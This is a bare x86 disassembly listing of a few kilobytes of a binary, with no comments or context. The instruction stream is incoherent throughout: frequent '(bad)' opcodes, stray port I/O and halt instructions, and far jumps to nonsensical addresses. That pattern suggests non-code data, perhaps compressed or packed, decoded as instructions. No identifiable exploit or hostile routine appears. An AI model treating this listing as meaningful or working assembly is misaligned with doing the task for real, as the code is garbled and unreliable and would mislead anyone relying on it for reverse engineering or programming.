  41a8a7:	add    ch,BYTE PTR [eax+ebp*1-0x818b7f7]
  41a8ae:	stos   DWORD PTR es:[edi],eax
  41a8af:	inc    ecx
  41a8b0:	stos   BYTE PTR es:[edi],al
  41a8b1:	dec    ebx
  41a8b2:	xlat   BYTE PTR ds:[ebx]
  41a8b3:	out    dx,al
  41a8b4:	(bad)  
  41a8b5:	lahf   
  41a8b6:	sbb    al,0xff
  41a8b8:	or     DWORD PTR [edi],ebp
  41a8ba:	js     0x41a87d
  41a8bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8bd:	mov    dl,0x2e
  41a8bf:	pcmpgtb mm3,QWORD PTR [edi+0x3578551e]
  41a8c6:	xchg   edi,eax
  41a8c7:	mov    ebp,0xc52e300f
  41a8cc:	jmp    0x41a8b9
  41a8ce:	lahf   
  41a8cf:	(bad)  
  41a8d0:	mov    ch,0x8d
  41a8d2:	into   
  41a8d3:	mov    esi,0x116ba22e
  41a8d8:	cmp    cl,ch
  41a8da:	adc    DWORD PTR [eax],0xfffffff1
  41a8dd:	cmp    BYTE PTR [ebx-0x14759a3c],0x79
  41a8e4:	not    BYTE PTR [esi-0x1b]
  41a8e7:	mov    edi,0x4feb5e11
  41a8ec:	lods   al,BYTE PTR ds:[esi]
  41a8ed:	stos   DWORD PTR es:[edi],eax
  41a8ee:	xchg   BYTE PTR [edi],cl
  41a8f0:	fmul   DWORD PTR [eax-0x39]
  41a8f3:	pop    edi
  41a8f4:	xchg   edi,eax
  41a8f5:	ret    
  41a8f6:	add    bh,BYTE PTR [esi-0x71e3fa70]
  41a8fc:	pushf  
  41a8fd:	push   ebp
  41a8fe:	cmp    bh,BYTE PTR [ebx]
  41a900:	scas   eax,DWORD PTR es:[edi]
  41a901:	scas   al,BYTE PTR es:[edi]
  41a902:	xor    al,0xf3
  41a904:	lock push edi
  41a906:	fnstenv cs:[ecx-0x40aae443]
  41a90d:	sahf   
  41a90e:	div    DWORD PTR [ecx]
  41a910:	cmp    BYTE PTR [esi],dh
  41a912:	push   edx
  41a913:	sar    DWORD PTR ds:0xb940c5b3,1
  41a919:	xchg   DWORD PTR [edx],ecx
  41a91b:	jg     0x41a99a
  41a91d:	or     ecx,0xd01d9521
  41a923:	inc    ecx
  41a924:	jg     0x41a944
  41a926:	div    BYTE PTR [eax]
  41a928:	add    ecx,DWORD PTR [eax]
  41a92a:	jg     0x41a90d
  41a92c:	mov    esp,0x7bb856a1
  41a931:	imul   edx,DWORD PTR [ebp-0x7e],0x1a098af3
  41a938:	je     0x41a8e3
  41a93a:	stos   DWORD PTR es:[edi],eax
  41a93b:	and    esp,DWORD PTR [edx+0x4c1adca8]
  41a941:	inc    esp
  41a942:	xor    BYTE PTR [ecx],0xe8
  41a945:	mov    ds:0x90db80ca,eax
  41a94a:	ret    0xa8ca
  41a94d:	pop    ds
  41a94e:	retf   0x97dd
  41a951:	lahf   
  41a952:	and    ebp,ecx
  41a954:	(bad)  
  41a957:	mov    ebx,0x113b08dd
  41a95c:	fld    DWORD PTR [edi+ecx*8]
  41a95f:	mov    ah,ah
  41a961:	pushaw 
  41a963:	dec    ebx
  41a964:	dec    ecx
  41a965:	dec    ebp
  41a966:	xchg   BYTE PTR [esi-0x73],dl
  41a969:	pop    bp
  41a96b:	icebp  
  41a96c:	dec    edi
  41a96d:	mov    ds:0x727c415a,al
  41a972:	push   0x3b08f8cc
  41a977:	xchg   edx,eax
  41a978:	imul   esp,DWORD PTR [edi*8+0x43e6dd8b],0x1db8960a
  41a983:	(bad)  
  41a984:	jecxz  0x41a9ad
  41a986:	push   edi
  41a987:	sub    BYTE PTR [eax+0x10],dh
  41a98a:	push   ss
  41a98b:	push   ecx
  41a98c:	js     0x41a9bf
  41a98e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a98f:	retf   
  41a990:	xchg   esi,eax
  41a991:	out    0xb1,al
  41a993:	jns    0x41a937
  41a995:	sbb    al,0x90
  41a997:	pop    esi
  41a998:	sub    eax,DWORD PTR [ebx+esi*4]
  41a99b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a99c:	test   DWORD PTR [ecx+0x8],ecx
  41a99f:	xchg   DWORD PTR [ebp+0x4fc00397],edx
  41a9a5:	dec    ecx
  41a9a6:	or     DWORD PTR [esi-0x33],esi
  41a9a9:	ss mov al,0x40
  41a9ac:	dec    esi
  41a9ad:	daa    
  41a9ae:	ins    BYTE PTR es:[edi],dx
  41a9af:	xor    BYTE PTR [edi],dh
  41a9b1:	push   cs
  41a9b2:	jl     0x41a990
  41a9b4:	imul   eax,DWORD PTR [eax+ebx*8],0xda97d8ac
  41a9bb:	push   ebp
  41a9bc:	aaa    
  41a9bd:	sti    
  41a9be:	push   es
  41a9bf:	out    0x46,al
  41a9c1:	inc    esi
  41a9c2:	leave  
  41a9c3:	cmp    DWORD PTR ds:0xd6328182,ebx
  41a9c9:	pop    ss
  41a9ca:	or     dl,0xf9
  41a9cd:	es pop ss
  41a9cf:	push   0xffffffa1
  41a9d1:	pop    esi
  41a9d2:	imul   ecx,esp,0xb3d15baa
  41a9d8:	pop    ebp
  41a9d9:	pop    esp
  41a9da:	inc    esp
  41a9db:	shl    DWORD PTR [edx],0xd6
  41a9de:	xchg   edi,eax
  41a9df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9e0:	add    DWORD PTR [ebx],ebx
  41a9e2:	enter  0xa69a,0x9e
  41a9e6:	cmp    eax,0x6e35c2f9
  41a9eb:	test   BYTE PTR [edx],bl
  41a9ed:	in     al,0x2f
  41a9ef:	jmp    0x7944:0x4766b4c2
  41a9f6:	inc    ebx
  41a9f7:	xchg   esi,eax
  41a9f8:	push   0xffffffa2
  41a9fa:	mov    al,0x35
  41a9fc:	xor    cl,0x67
  41a9ff:	in     al,dx
  41aa00:	(bad)  
  41aa01:	mov    eax,0x83ff767a
  41aa06:	xor    DWORD PTR [ecx+ecx*1],esp
  41aa09:	jne    0x41a9c9
  41aa0b:	and    eax,0x8d767e3f
  41aa10:	push   ebp
  41aa11:	ret    
  41aa12:	dec    eax
  41aa13:	mov    esp,0xc6605f78
  41aa18:	rcl    DWORD PTR [esi],cl
  41aa1a:	test   al,0xac
  41aa1c:	sbb    bl,BYTE PTR fs:[ebx-0x3e3a1f7f]
  41aa23:	test   DWORD PTR [eax+0x1a],ebp
  41aa26:	rcl    ch,0xbd
  41aa29:	fwait
  41aa2a:	xchg   edx,eax
  41aa2b:	adc    dl,BYTE PTR [edx+0x4b]
  41aa2e:	adc    ah,BYTE PTR ds:0x282f550
  41aa34:	ja     0x41aa31
  41aa36:	dec    ebp
  41aa37:	jl     0x41aa84
  41aa39:	xchg   ecx,eax
  41aa3a:	mov    ch,BYTE PTR [esi+eiz*2+0x27]
  41aa3e:	ins    DWORD PTR es:[edi],dx
  41aa3f:	xor    ch,BYTE PTR [eax+0x69]
  41aa42:	into   
  41aa43:	jne    0x41aa75
  41aa45:	ror    ah,0x95
  41aa48:	in     eax,0x1
  41aa4a:	stc    
  41aa4b:	jo     0x41aa9f
  41aa4d:	jnp    0x41aa4a
  41aa4f:	not    BYTE PTR [edi-0x2b919f3f]
  41aa55:	mov    esp,0xe1ad82d3
  41aa5a:	inc    ebp
  41aa5b:	test   eax,0x4f58331b
  41aa60:	adc    ah,dh
  41aa62:	stc    
  41aa63:	retf   
  41aa64:	add    eax,0x456ea8cb
  41aa69:	sub    BYTE PTR [esi-0x31],cl
  41aa6c:	xchg   BYTE PTR ds:0xf0b7d22e,ah
  41aa72:	cdq    
  41aa73:	pop    eax
  41aa74:	pop    ds
  41aa75:	sbb    eax,0x9937ace7
  41aa7a:	stos   DWORD PTR es:[edi],eax
  41aa7b:	jae    0x41a9fd
  41aa7d:	cmp    DWORD PTR [ebp+0x2d83a0ff],edx
  41aa83:	or     eax,0xaec030b8
  41aa88:	outs   dx,BYTE PTR ds:[esi]
  41aa89:	inc    ebp
  41aa8a:	xchg   DWORD PTR [eax+0x79a37f41],ecx
  41aa90:	pop    esp
  41aa91:	inc    ebx
  41aa92:	test   BYTE PTR [esp+eax*8],ah
  41aa95:	out    dx,eax
  41aa96:	xor    ebp,DWORD PTR [ecx]
  41aa98:	mov    esi,ecx
  41aa9a:	pop    ebp
  41aa9b:	les    esp,FWORD PTR [ebx-0x76145438]
  41aaa1:	adc    al,0xec
  41aaa3:	add    ebp,ebp
  41aaa5:	test   al,0x3d
  41aaa7:	mov    ebx,0x2b80db8f
  41aaac:	xlat   BYTE PTR ds:[ebx]
  41aaad:	mov    ds:0x7e61236,al
  41aab2:	out    0x54,al
  41aab4:	inc    edx
  41aab5:	jnp    0x41aac5
  41aab7:	xchg   eax,ebx
  41aab9:	cwde   
  41aaba:	shl    DWORD PTR [ebx-0x5ea9c335],0xfe
  41aac1:	and    eax,DWORD PTR [esi-0x23]
  41aac4:	imul   esp,DWORD PTR [eax],0xe1bbe51d
  41aaca:	mov    ds:0x1e8a17e2,al
  41aacf:	mov    eax,ds:0xdc253047
  41aad4:	mov    ebx,0x5c95af84
  41aad9:	push   ds
  41aada:	xor    BYTE PTR cs:[edx-0x6],bh
  41aade:	pushf  
  41aadf:	jg     0x41ab54
  41aae1:	inc    ebp
  41aae2:	mov    edx,0xe0c435a1
  41aae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aae8:	and    eax,0xbfee4965
  41aaed:	jg     0x41aadf
  41aaef:	gs stc 
  41aaf1:	push   0x37
  41aaf3:	add    bh,BYTE PTR [ebx+eiz*8]
  41aaf6:	shl    BYTE PTR [edi+0x2d2ddd97],cl
  41aafc:	push   esi
  41aafd:	stos   BYTE PTR es:[edi],al
  41aafe:	test   al,0xa6
  41ab00:	cmp    DWORD PTR [edx+0x7441cc3],ebx
  41ab06:	mov    edx,0x8dae498e
  41ab0b:	mov    cl,0x1c
  41ab0d:	adc    DWORD PTR [eax-0x3c812e7b],ebp
  41ab13:	add    DWORD PTR [eax+0x6c],esp
  41ab16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab17:	daa    
  41ab18:	in     eax,0x2c
  41ab1a:	call   0x25229fa2
  41ab1f:	add    BYTE PTR [edi-0x6a],ch
  41ab22:	or     cl,dh
  41ab24:	add    DWORD PTR [esi],eax
  41ab26:	sbb    eax,0x8ede3624
  41ab2b:	adc    dl,0xbf
  41ab2e:	retf   0xd4c2
  41ab31:	or     DWORD PTR [ecx-0x5b],esi
  41ab34:	fist   DWORD PTR [ecx-0x6f59597a]
  41ab3a:	idiv   BYTE PTR [edi]
  41ab3c:	pusha  
  41ab3d:	fbstp  TBYTE PTR [edx-0x4f]
  41ab40:	fs mov eax,0x64b77144
  41ab46:	in     eax,0xaf
  41ab48:	mov    ah,0x50
  41ab4a:	or     DWORD PTR [edi-0x7dbf7614],ebp
  41ab50:	popa   
  41ab51:	or     eax,0x93c0aa4b
  41ab56:	dec    ecx
  41ab57:	and    cl,BYTE PTR [ecx-0x1d]
  41ab5a:	mov    WORD PTR [edx],fs
  41ab5c:	sbb    eax,0x28ab1ff0
  41ab61:	pop    eax
  41ab62:	scas   eax,DWORD PTR es:[edi]
  41ab63:	neg    DWORD PTR [edi-0x4384bf78]
  41ab69:	out    0x10,al
  41ab6b:	mov    al,0x8
  41ab6d:	sbb    bh,ch
  41ab6f:	mov    ah,0x2b
  41ab71:	add    BYTE PTR ds:0xa0d985de,cl
  41ab77:	adc    DWORD PTR [eax],0xffffffdd
  41ab7a:	test   eax,0x63ca3e46
  41ab7f:	jns    0x41ab17
  41ab81:	fnstcw WORD PTR [ecx]
  41ab83:	or     eax,0x74428e2e
  41ab88:	jmp    0x12b7ebc0
  41ab8d:	(bad)  
  41ab8e:	fcmove st,st(1)
  41ab90:	adc    al,0xf7
  41ab92:	cmp    DWORD PTR [eax],ecx
  41ab94:	jecxz  0x41ab68
  41ab96:	lahf   
  41ab97:	and    DWORD PTR [eax],ecx
  41ab99:	inc    ebp
  41ab9a:	push   0x43
  41ab9c:	mov    dh,0xe9
  41ab9e:	(bad)
  41aba1:	mov    eax,ds:0xd1ed131a
  41aba6:	mov    al,ds:0x99eaf37f
  41abab:	cwde   
  41abac:	sub    al,bl
  41abae:	adc    DWORD PTR [edi-0x80],0xad95c1b2
  41abb5:	mov    eax,ds:0x435e51aa
  41abba:	into   
  41abbb:	int3   
  41abbc:	push   eax
  41abbd:	rcl    DWORD PTR [ecx*2+0x3a1f6a2b],0x2
  41abc5:	mov    esp,0xdb7e98c0
  41abca:	mov    dh,0x54
  41abcc:	xlat   BYTE PTR ds:[ebx]
  41abcd:	ret    
  41abce:	jne    0x41ac08
  41abd0:	pop    ebx
  41abd1:	jle    0x41ab6d
  41abd3:	add    esi,DWORD PTR [eax-0x5]
  41abd6:	bound  eax,QWORD PTR [esi-0x287bb935]
  41abdc:	ret    0x7e7d
  41abdf:	xchg   ebx,eax
  41abe0:	cdq    
  41abe1:	(bad)  
  41abe2:	cld    
  41abe3:	lods   eax,DWORD PTR ds:[esi]
  41abe4:	outs   dx,BYTE PTR ds:[esi]
  41abe5:	push   cs
  41abe6:	cmp    DWORD PTR [edx-0x556e6754],esi
  41abec:	test   DWORD PTR ds:0xb697488a,edx
  41abf2:	int3   
  41abf3:	dec    esp
  41abf4:	popa   
  41abf5:	push   0x46
  41abf7:	outs   dx,DWORD PTR ds:[esi]
  41abf8:	hlt    
  41abf9:	pop    ds
  41abfa:	test   BYTE PTR [ecx+0x2151c494],bh
  41ac00:	xchg   ecx,eax
  41ac01:	jmp    0x49a:0x57366d66
  41ac08:	scas   al,BYTE PTR es:[edi]
  41ac09:	out    dx,al
  41ac0a:	adc    DWORD PTR [edx+ebx*1-0x356e9db9],ecx
  41ac11:	jb     0x41ac2f
  41ac13:	inc    ecx
  41ac14:	pop    eax
  41ac15:	imul   ebp,DWORD PTR [eax],0xffffffdc
  41ac18:	and    BYTE PTR [ecx],dl
  41ac1a:	mov    esp,0xca255b71
  41ac1f:	stos   DWORD PTR es:[edi],eax
  41ac20:	dec    esp
  41ac21:	mov    ch,0x7b
  41ac23:	push   es
  41ac24:	outs   dx,BYTE PTR ds:[esi]
  41ac25:	xchg   ecx,eax
  41ac26:	mov    ecx,0x4ee2eb40
  41ac2b:	jo     0x41ac96
  41ac2d:	mov    ds:0x328ed89b,eax
  41ac32:	mov    dh,0xdc
  41ac34:	leave  
  41ac35:	retf   0x66fa
  41ac38:	sbb    edx,edi
  41ac3a:	cmp    bl,BYTE PTR [esi+0x95c0927]
  41ac40:	test   DWORD PTR [edi+edx*8],edx
  41ac43:	push   esi
  41ac44:	rol    esi,1
  41ac46:	and    BYTE PTR [edx+ebx*1-0x62],dh
  41ac4a:	push   eax
  41ac4b:	aad    0x99
  41ac4d:	outs   dx,BYTE PTR ds:[esi]
  41ac4e:	cmp    ch,BYTE PTR [ecx-0x4aaea9b9]
  41ac54:	jae    0x41ac89
  41ac56:	push   es
  41ac57:	push   eax
  41ac58:	clc    
  41ac59:	sub    BYTE PTR ds:0x9d5e8f69,bl
  41ac5f:	xchg   esp,eax
  41ac60:	cdq    
  41ac61:	hlt    
  41ac62:	lock ja 0x41abeb
  41ac65:	dec    edi
  41ac66:	cmp    BYTE PTR [edi+ecx*8-0x19],bh
  41ac6a:	push   eax
  41ac6b:	mov    eax,ds:0x31a63533
  41ac70:	adc    dl,bh
  41ac72:	into   
  41ac73:	sub    ch,BYTE PTR [edx]
  41ac75:	ficomp WORD PTR [edx+ebx*1-0x1a377541]
  41ac7c:	jne    0x41ac68
  41ac7e:	rol    ebp,cl
  41ac80:	cdq    
  41ac81:	(bad)  
  41ac82:	icebp  
  41ac83:	outs   dx,BYTE PTR ds:[esi]
  41ac84:	xchg   edx,eax
  41ac85:	and    eax,0xc4ff3d0d
  41ac8a:	int3   
  41ac8b:	sti    
  41ac8c:	sub    BYTE PTR [esi+esi*2-0x75de364],al
  41ac93:	ds jo  0x41ac48
  41ac96:	dec    edi
  41ac97:	lea    edi,[edx-0x78]
  41ac9a:	adc    al,0x4b
  41ac9c:	shr    BYTE PTR [edx-0x66f24bbd],0x68
  41aca3:	enter  0x9f95,0xd6
  41aca7:	test   DWORD PTR [esi],edx
  41aca9:	sub    esi,ebp
  41acab:	outs   dx,DWORD PTR ds:[esi]
  41acac:	jb     0x41ac67
  41acae:	int3   
  41acaf:	leave  
  41acb0:	sar    DWORD PTR [edx+0x27],1
  41acb3:	std    
  41acb4:	mov    ecx,ss
  41acb6:	add    ebp,edi
  41acb8:	pop    esp
  41acb9:	hlt    
  41acba:	mov    dh,0xcd
  41acbc:	nop
  41acbd:	std    
  41acbe:	inc    eax
  41acbf:	popf   
  41acc0:	neg    ch
  41acc2:	dec    edx
  41acc3:	mov    BYTE PTR [eax+0x78],dl
  41acc6:	and    eax,esi
  41acc8:	jb     0x41ad11
  41acca:	dec    edx
  41accb:	mov    bl,cl
  41accd:	fisttp DWORD PTR [ecx]
  41accf:	xchg   ebp,eax
  41acd0:	nop
  41acd1:	push   esi
  41acd2:	ja     0x41ac56
  41acd4:	lods   eax,DWORD PTR ds:[esi]
  41acd5:	push   eax
  41acd6:	popf   
  41acd7:	lds    edx,FWORD PTR [ecx-0x5fabd6cd]
  41acdd:	inc    esi
  41acde:	xor    ecx,edi
  41ace0:	loopne 0x41ad20
  41ace2:	sub    bl,dl
  41ace4:	push   ebx
  41ace5:	fidiv  WORD PTR [esi+0x8]
  41ace8:	sbb    DWORD PTR [esi],edx
  41acea:	mov    bh,BYTE PTR [eax+edi*2]
  41aced:	into   
  41acee:	pop    edi
  41acef:	cdq    
  41acf0:	ficomp DWORD PTR [ecx+0x59]
  41acf3:	adc    edi,DWORD PTR [esp+ebx*1-0xf]
  41acf7:	xchg   ecx,eax
  41acf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acf9:	sbb    edx,DWORD PTR [esi]
  41acfb:	cmc    
  41acfc:	pop    es
  41acfd:	xor    al,0xd2
  41acff:	mov    ecx,0xcf44724b
  41ad04:	retf   0xd2e9
  41ad07:	fnstsw WORD PTR [eax-0x4]
  41ad0a:	mov    ds:0x1411616c,eax
  41ad0f:	iret   
  41ad10:	retf   0x8f1
  41ad13:	rol    DWORD PTR [edi+0x86a3839],0x26
  41ad1a:	mov    ebp,0x84146108
  41ad1f:	int3   
  41ad20:	data16 fisttp WORD PTR [ecx]
  41ad23:	pop    ds
  41ad24:	in     al,0xdc
  41ad26:	and    eax,0x47aef5f8
  41ad2b:	pop    ds
  41ad2c:	jo     0x41ad56
  41ad2e:	mov    al,ds:0x87ab8377
  41ad33:	pop    edi
  41ad34:	int3   
  41ad35:	pop    es
  41ad36:	dec    edi
  41ad37:	inc    edx
  41ad38:	pop    ebp
  41ad39:	out    0xce,eax
  41ad3b:	jp     0x41acef
  41ad3d:	mov    ebx,0xa1ee6e96
  41ad42:	and    BYTE PTR [ecx-0x32b07435],bl
  41ad48:	jo     0x41ad15
  41ad4a:	mov    ebx,0x4cc1b2ed
  41ad4f:	adc    al,0xc1
  41ad51:	add    al,0xad
  41ad53:	xchg   edi,eax
  41ad54:	jmp    0x55f1:0x90f4c5c2
  41ad5b:	pop    ss
  41ad5c:	or     ebx,edi
  41ad5e:	sbb    edi,DWORD PTR [ebx+0x78e3d191]
  41ad64:	push   ebx
  41ad65:	shr    DWORD PTR [eax+0x64],0xe3
  41ad69:	add    al,BYTE PTR [eax]
  41ad6b:	ins    BYTE PTR es:[edi],dx
  41ad6c:	sub    BYTE PTR [ebp-0x2b],0x5b
  41ad70:	loopne 0x41ada7
  41ad72:	add    ebp,DWORD PTR [eax]
  41ad74:	test   DWORD PTR [ebx-0x1e03a68a],esi
  41ad7a:	popa   
  41ad7b:	mov    al,ds:0x5ba7b8c0
  41ad80:	inc    ebx
  41ad81:	xbegin 0x155e491c
  41ad87:	inc    eax
  41ad88:	xor    ch,BYTE PTR [eax]
  41ad8a:	push   0x5e3149c7
  41ad8f:	pop    esi
  41ad90:	sbb    cl,0xb2
  41ad93:	mov    edi,0x6800f582
  41ad98:	push   cs
  41ad99:	ret    
  41ad9a:	(bad)  
  41ad9b:	test   al,0xcf
  41ad9d:	pop    es
  41ad9e:	cmp    DWORD PTR [ecx+edx*1+0x6a],eax
  41ada2:	mov    dh,0x8e
  41ada4:	not    BYTE PTR [esi-0x4f0a73f]
  41adaa:	std    
  41adab:	push   0xffffffe2
  41adad:	dec    ecx
  41adae:	adc    esp,DWORD PTR [eax+0x6a]
  41adb1:	es test ch,cl
  41adb4:	test   al,0x7a
  41adb6:	add    DWORD PTR [edx+0x58],edi
  41adb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adba:	ds xchg ecx,eax
  41adbc:	mov    ah,0x18
  41adbe:	es loop 0x41ad48
  41adc1:	rcr    BYTE PTR [ebx-0x138fb3b],1
  41adc7:	scas   al,BYTE PTR es:[edi]
  41adc8:	int3   
  41adc9:	and    eax,0xb804b04a
  41adce:	add    bh,BYTE PTR [ebx+esi*4+0x61]
  41add2:	xchg   esp,eax
  41add3:	jbe    0x41ad80
  41add5:	mov    edi,0xaa70c5f8
  41adda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41addb:	mov    eax,ds:0xa070587c
  41ade0:	ret    
  41ade1:	das    
  41ade2:	or     al,BYTE PTR [edx+0x6b0b8060]
  41ade8:	aad    0x37
  41adea:	(bad)  
  41adeb:	push   esi
  41adec:	imul   BYTE PTR [ebp-0x1fc5c143]
  41adf2:	stos   BYTE PTR es:[edi],al
  41adf3:	and    ecx,edi
  41adf5:	xor    ch,BYTE PTR [edi-0x7b678149]
  41adfb:	stc    
  41adfc:	jnp    0x41ad8d
  41adfe:	hlt    
  41adff:	mov    BYTE PTR [ecx],bl
  41ae01:	sbb    edi,esi
  41ae03:	inc    ebp
  41ae04:	mov    esp,0x9474ab9e
  41ae09:	shr    BYTE PTR [esi],cl
  41ae0b:	dec    ecx
  41ae0c:	add    eax,0xf27e24a6
  41ae11:	shl    DWORD PTR [esi+0x3e9e424e],1
  41ae17:	shr    DWORD PTR cs:[eax+0x7a6822bc],1
  41ae1e:	inc    edx
  41ae1f:	mov    ds:0xdde673fa,al
  41ae24:	inc    esp
  41ae25:	cmp    al,0x38
  41ae27:	fsub   QWORD PTR [edx+0x2a1cfc42]
  41ae2d:	or     cl,BYTE PTR [edx-0x6b045a51]
  41ae33:	push   es
  41ae34:	test   BYTE PTR [ebx-0x49],al
  41ae37:	sahf   
  41ae38:	cs (bad) 
  41ae3a:	lds    edi,FWORD PTR [edi-0x3d4f9e6d]
  41ae40:	inc    esp
  41ae41:	ins    DWORD PTR es:[edi],dx
  41ae42:	fcom   DWORD PTR [edi+0x16]
  41ae45:	mov    bh,0x4f
  41ae47:	or     eax,0x38157617
  41ae4c:	mov    WORD PTR [esi+0xa],ds
  41ae4f:	sar    BYTE PTR [eax],0x87
  41ae52:	mov    bl,bh
  41ae54:	mov    WORD PTR [ecx],cs
  41ae56:	mov    edi,0x63d0ecf
  41ae5b:	push   ss
  41ae5c:	inc    esp
  41ae5d:	(bad)  
  41ae5e:	inc    ecx
  41ae5f:	test   bl,0x97
  41ae62:	cmp    edx,edx
  41ae64:	(bad)  
  41ae65:	gs (bad) 
  41ae67:	fs inc esp
  41ae69:	fidivr WORD PTR [edi+0xb]
  41ae6c:	push   cs
  41ae6d:	sub    al,0xf1
  41ae6f:	lods   al,BYTE PTR ds:[esi]
  41ae70:	mov    fs,WORD PTR [edx-0x67]
  41ae73:	cmc    
  41ae74:	retf   0x57f6
  41ae77:	or     ebx,DWORD PTR [edi-0x72]
  41ae7a:	rcl    BYTE PTR [ecx+0x5c9931f5],1
  41ae80:	mov    ch,0xf1
  41ae82:	(bad)  
  41ae83:	xchg   esi,eax
  41ae84:	hlt    
  41ae85:	(bad)  
  41ae86:	hlt    
  41ae87:	les    ebp,FWORD PTR ds:0x31b4226c
  41ae8d:	loope  0x41ae9f
  41ae8f:	jne    0x41ae2f
  41ae91:	pushf  
  41ae92:	test   DWORD PTR [ebp-0x6058b015],0x48feb1f2
  41ae9c:	push   edi
  41ae9d:	push   es
  41ae9e:	sbb    esp,DWORD PTR cs:[esi]
  41aea1:	fucomip st,st(1)
  41aea3:	retf   0x59e4
  41aea6:	mov    WORD PTR [esi+0x5c73bbd3],gs
  41aeac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aead:	pop    edi
  41aeae:	and    al,0x6f
  41aeb0:	inc    ebx
  41aeb1:	cmc    
  41aeb2:	jg     0x41aeb7
  41aeb4:	cmp    eax,0x62c1003c
  41aeb9:	(bad)  
  41aeba:	loop   0x41aea7
  41aebc:	xchg   ecx,eax
  41aebd:	mov    bh,0x9e
  41aebf:	xchg   edi,eax
  41aec0:	pop    esi
  41aec1:	sbb    BYTE PTR [ecx-0x1a],0xf
  41aec5:	push   0xb3d9e3a1
  41aeca:	fld    QWORD PTR [ebx+ebp*4]
  41aecd:	add    ch,0x8f
  41aed0:	bound  edx,QWORD PTR [ebp+0x7d3cd414]
  41aed6:	je     0x41ae83
  41aed8:	push   0x53
  41aeda:	jb     0x41aeac
  41aedc:	inc    eax
  41aedd:	iret   
  41aede:	mov    cl,0x1f
  41aee0:	push   es
  41aee1:	sub    BYTE PTR [ebx],dh
  41aee3:	jge    0x41af37
  41aee5:	dec    eax
  41aee6:	jns    0x41aee0
  41aee8:	imul   edx,esi,0x7a527380
  41aeee:	shl    BYTE PTR [edi],cl
  41aef0:	(bad)  
  41aef1:	int3   
  41aef2:	inc    edx
  41aef3:	mov    ds:0xd7d8a967,al
  41aef8:	call   0x3fe0:0x884c32fe
  41aeff:	inc    ebx
  41af00:	fst    DWORD PTR [eax]
  41af02:	aad    0xc
  41af04:	sbb    DWORD PTR [eax+0x7e],0x2c
  41af08:	xor    esi,DWORD PTR [esi]
  41af0a:	in     al,dx
  41af0b:	push   ebx
  41af0c:	cs xchg edi,eax
  41af0e:	sub    al,0xc
  41af10:	retf   0x6845
  41af13:	adc    al,0xaf
  41af15:	xchg   ebx,eax
  41af16:	adc    eax,0xe6a9d300
  41af1b:	imul   BYTE PTR [esi+0x1]
  41af1e:	mov    BYTE PTR [edi],ch
  41af20:	imul   eax,esp,0xecb7993
  41af26:	fdivr  QWORD PTR [esi+0x10]
  41af29:	xchg   esp,eax
  41af2a:	out    dx,al
  41af2b:	mov    BYTE PTR [ecx+eax*4-0x2f],al
  41af2f:	mov    esi,0xdc4b16d7
  41af34:	xor    DWORD PTR [edi-0xfb90ebd],eax
  41af3a:	adc    al,0x69
  41af3c:	sahf   
  41af3d:	cdq    
  41af3e:	dec    ebp
  41af3f:	int    0xfd
  41af41:	add    edi,ebp
  41af43:	ror    BYTE PTR [ebp+0x36fc2272],cl
  41af49:	mov    dl,cl
  41af4b:	addr16 test dh,dh
  41af4e:	mov    ds:0x72865d50,al
  41af53:	cmp    eax,0xd37a23d
  41af58:	mov    ecx,0x6ec22224
  41af5d:	xor    ah,al
  41af5f:	fld    TBYTE PTR [ebp-0x68af4025]
  41af65:	push   esp
  41af66:	dec    esp
  41af67:	jno    0x41af9d
  41af69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af6a:	data16 hlt 
  41af6c:	ficomp DWORD PTR [edx-0x4]
  41af6f:	inc    eax
  41af70:	xor    DWORD PTR [ebx],esi
  41af72:	lahf   
  41af73:	or     DWORD PTR [edi],ebx
  41af75:	pop    es
  41af76:	(bad)  
  41af77:	adc    edi,DWORD PTR [eax+0x5e]
  41af7a:	mov    esi,ss
  41af7c:	mov    ah,0x6
  41af7e:	test   DWORD PTR [esp+eiz*4-0x39],edi
  41af82:	ins    DWORD PTR es:[edi],dx
  41af83:	xchg   ecx,eax
  41af84:	mov    ds:0xa3b75d44,al
  41af89:	ret    
  41af8a:	xor    al,0xc8
  41af8c:	xor    DWORD PTR [ecx],edx
  41af8e:	inc    esp
  41af8f:	clc    
  41af90:	faddp  st(1),st
  41af92:	sub    BYTE PTR [ebp+0x500f6382],bl
  41af98:	rol    BYTE PTR ds:0xea01fe0a,1
  41af9e:	cmp    al,0x5c
  41afa0:	daa    
  41afa1:	imul   BYTE PTR [edx+ebx*4+0x42]
  41afa5:	(bad)  
  41afa7:	std    
  41afa8:	xor    eax,0xdcf8e169
  41afad:	and    ah,bl
  41afaf:	or     dl,dl
  41afb1:	cmp    DWORD PTR [edi-0x7318e27a],esi
  41afb7:	repz or al,0xc3
  41afba:	lods   eax,DWORD PTR ds:[esi]
  41afbb:	les    esp,FWORD PTR [ebp+ebx*4-0x6fad8721]
  41afc2:	fstp   TBYTE PTR [ecx-0x16b4ed7]
  41afc8:	cmp    ecx,esp
  41afca:	xor    edx,esi
  41afcc:	jo     0x41b041
  41afce:	or     eax,0x4459bbdb
  41afd3:	out    dx,eax
  41afd4:	adc    al,0x94
  41afd6:	adc    dl,dl
  41afd8:	cs out dx,al
  41afda:	in     al,0xbd
  41afdc:	out    0xa1,al
  41afde:	mov    ebp,0x1f9f8cc9
  41afe3:	enter  0xe7f0,0x4e
  41afe7:	enter  0x14cd,0x7c
  41afeb:	hlt    
  41afec:	scas   al,BYTE PTR es:[edi]
  41afed:	jmp    0x785c54df
  41aff2:	mov    edx,0x6d914d8
  41aff7:	lods   al,BYTE PTR ds:[esi]
  41aff8:	push   esp
  41aff9:	push   edx
  41affa:	std    
  41affb:	adc    ebx,DWORD PTR [eax+0x6c]
  41affe:	adc    esp,DWORD PTR [ecx+0x6cb51665]
  41b004:	in     eax,0x46
  41b006:	not    DWORD PTR [eax+0x7c2359f8]
  41b00c:	adc    BYTE PTR [esi-0x16],0x96
